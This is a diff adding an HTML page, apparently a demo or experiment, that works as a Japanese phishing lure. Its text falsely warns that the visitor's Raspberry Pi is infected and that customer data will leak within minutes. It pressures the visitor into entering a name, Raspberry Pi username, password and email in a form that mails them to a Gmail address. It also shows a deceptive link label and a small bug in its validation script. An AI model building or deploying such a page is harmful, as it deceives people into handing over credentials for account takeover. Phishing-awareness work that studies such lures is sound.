@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RadpberryPi（jikkennDEMOsite)</title>
+<script>
+        function validateForm() {
+            var name = document.getElementById('name').value;
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var email = document.getElementById('email').value;
+
+            if (name.trim() === '' || email.trim() === '' || message.trim() === '') {
+                alert('Please fill in all fields');
+                return false;
+            }
+
+            // サーバーサイドでのメール送信を行うための手順は記載していませんが、ここでの検証が成功した場合の処理を記述します
+            return true;
+        }
+    </script>
+</head>
+<body>
+<font size="+2"><span style="color:yellow;">緊急！！</span></font><br>あなたのRaspberryPiが何かのウイルスに感染しています！！<br>このままでは数分後までに停止し、そちらの会社にかかわるすべての顧客の個人情報が流出してしまいます！！直ちに
+<ul>
+<li><b>あなたのお名前</b></li><li><b>RaspberryPiのユーザー名</b></li><li><b>パスワード</b></li><li><b>メールアドレス</b></li>
+</ul>
+を書き、送信してください！！<br>
+<form action="mailto:potatoyamada@gmail.com" method="post">
+        <label for="name">あなたのお名前:</label><br>
+        <input type="text" id="name" name="name"><br>
+	<label for="username">raspberrypiのユーザー名:</label><br>
+        <input type="text" id="username" name="username"><br>
+	<label for="password">パスワード:</label><br>
+        <input type="text" id="password" name="password"><br>
+	<label for="email">メールアドレス:</label><br>
+        <input type="text" id="email" name="email"><br><br>
+        <input type="submit" value="送信">
+    </form>
+
+
+＊こちらの個人情報は他へ一切提供いたしません。<br>
+その他何かご不明な点がございましたら以下のURLからお問い合わせください。<br><a href="http://www.yahoo.co.jp/">otoiawase.com.jp</a>
+</table>
+</body>
+</html>
